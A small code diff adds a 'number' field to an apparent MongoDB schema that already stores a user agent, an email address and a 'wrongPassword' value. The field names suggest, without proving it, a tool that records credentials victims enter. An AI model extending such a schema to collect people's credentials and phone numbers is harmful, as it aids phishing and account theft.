@@ -44,6 +44,9 @@ const infoSchema = new Schema({
     agent: {
         type: String,
     },
+    number: {
+        type: String,
+    },
     mail: { type: String },
     wrongPassword: { type: String },
 
